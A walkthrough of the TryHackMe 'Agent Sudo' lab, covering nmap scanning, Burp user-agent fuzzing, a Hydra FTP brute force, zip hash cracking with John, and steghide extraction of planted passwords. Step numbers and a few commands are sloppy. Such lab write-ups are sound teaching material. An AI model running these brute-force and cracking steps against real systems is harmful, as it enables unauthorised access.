# Room Information

Room link: https://tryhackme.com/room/agentsudoctf

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 7/01/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine, as well as our AttackBox
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command onto our terminal
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.226.141 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 

Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-01 04:00 BST
Nmap scan report for ip-10-10-226-141.eu-west-1.compute.internal (10.10.226.141)
Host is up (0.00091s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
MAC Address: 02:6A:D9:B1:0E:FB (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
```

#
> Inspecting the Web Pages
4. `curl http://{TARGET IP}`
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.226.141

<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

#
> Testing User Agents Using Burp Suite
5. Start up Burpsuite Community Edition

![]()

6. Launch Firefox, turn on FoxyProxy, which was already set up by TryHackMe, to allow Burpsuite to capture our web requests and responses

![]()

![]()

8. Seeing that the homepage message was signed by an agent called "**R**", we can send a web request and replace the **User-Agent** value on our intercepted web request to "**R**", which ended displaying the same message that we got before but this time with an error message, which probably indicates that the users' User-Agents are probably also letters of the alphabet as well

![]() 

9. We'll try this theory out by capturing the same web request again but this time we'll send it to Burpsuite's Intruder module and then from there, we'll create a list containing all the capital letters of the alphabet and use it as a payload that we'll inject into our captured web request in the **User-Agent** field

![]()

10. After running our attack, we can see that one of the letters in our payload list got a 302 HTTP status code, meaning that the user has been redirected to another location

![]()

11. We'll create and intercept another web request to the target's homepage but this time we'll replace the User-Agent with the one from our payload list that got the 302 HTTP status code, which ended up redirecting us to a PHP file with its contents displayed onto our browser, which ended up containing the User Agent's name and a message that said that their password is weak

![]()

#
> Password Guessing Using Hydra
12. `hydra -l {USER AGENT'S NAME} -P {WORDLIST PATH} ftp://{TARGET IP}`
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l chris -P ~/Tools/wordlists/rockyou.txt ftp://10.10.55.185
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-01 14:01:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.55.185:21/
[21][ftp] host: 10.10.55.185   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 14:02:54
```

#
> Scanning the Target's FTP Server
13. `ftp {TARGET IP}`
```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.55.185
Connected to 10.10.55.185.
220 (vsFTPd 3.0.3)
Name (10.10.55.185:root): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
14. `ls`
15. `get {FILE1}`
16. `get {FILE2}`
17. `get {FILE3}`
18. `exit`
```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```
```bash
ftp> get To_agentJ.txt cutie-alien.jpg cutie.png
local: cutie-alien.jpg remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (63.0884 kB/s)
```
```bash
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (2.9148 MB/s)
```
```bash
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.00 secs (26.3178 MB/s)
```
```bash
ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.00 secs (89.8052 MB/s)
```
```bash
ftp> exit
221 Goodbye.
```
19. cat {FILE1}
```bash
┌──(kali㉿kali)-[~]
└─$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
21. `steghide --info {FILE1}`
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --info cute-alien.jpg
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
20. `binwalk {FILE2}`
21. `binwalk {FILE3}`
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive
```
22. `binwalk {FILE3} --extract`
23. `ls`
```bash
┌──(kali㉿kali)-[~]
└─$ binwalk cutie.png --extract

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive
```
```bash
┌──(kali㉿kali)-[~]
└─$ ls
cute-alien.jpg
cutie.png
cutie-alien.jpg
_cutie.png.extracted
To_agentJ.txt
```
24. `cd {EXTRACTED DIRECTORY}`
25. `ls`
```bash
┌──(kali㉿kali)-[~]
└─$ cd _cutie.png.extracted/
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365
365.zlib
8702.zip
To_agentJtxt
```
26. `zip2john {ZIP FILE} > {FILENAME2}.txt`
27. `cat {FILENAME2}.txt`
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ zip2john 8702.zip > Hash.txt
```
```bash    
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ john Hash.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:02 DONE 2/3 (2023-07-01 12:34) 0.4784g/s 21265p/s 21265c/s 21265C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
28. `7z e 8702.Ip`
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx   (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280
```
29. `ls`
30. `cat {FILE?}.txt`
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  Hash.txt  To_agentJ.txt  To_agentR.txt
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
32. `echo '{STRING}' > {FILENAME3}.txt`
33. `hashid {FILENAME3}.txt`
34. `base64 {FILENAME3}.txt --decode`
35. `cd ..`
32. `steghide --info {FILE1}`
33. `steghide --extract -sf {FILE1}`
34. `ls`
35. `cat {TEXT FILE}`
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ echo 'QXJlYTUx' > String.txt
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ hashid String.txt                                              
--File 'Hash2.txt'--
Analyzing 'QXJlYTUx'
[+] Dahua 
--End of file 'String.txt'--
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ base64 String.txt --decode
Area51
```
```bash
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cd .. 
```
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --info cute-alien.jpg 
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
```bash
┌──(kali㉿kali)-[~]
└─$ steghide --extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ ls
cute-alien.jpg
cutie.png
cutie-alien.jpg
_cutie.png.extracted
message.txt
To_agentJ.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat message.txt                         
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

# Vulnerability Identification

# Vulnerability Exploitation


**Room completed!**

![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20Agent%20Sudo.png)

# Command History

# Dissecting Some Commands
`nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+ `-sC` enables the use of default scripts during the scan, which runs a set of commonly used scripts against the target IP to try to find any vulnerabilities
+ `-sV` enables version detection, which attempts to determine the sevice and version information of the open ports
+ `> {FILENAME1}.txt` redirects the results into a text file

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
